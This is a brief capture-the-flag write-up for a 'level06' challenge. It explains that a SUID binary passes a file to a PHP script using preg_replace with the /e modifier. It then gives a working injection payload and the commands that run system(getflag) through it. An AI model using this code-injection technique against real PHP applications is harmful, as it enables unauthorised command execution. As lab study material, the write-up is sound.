`level06` has SUID bit set
`level06` executes `level06.php` with a filename as argument.
`level06.php` uses `preg_replace` with `/e` which allow us to call a function when a regex match


```
echo '[x {${system(getflag)}}]' > /tmp/a
./level06 /tmp/a
```
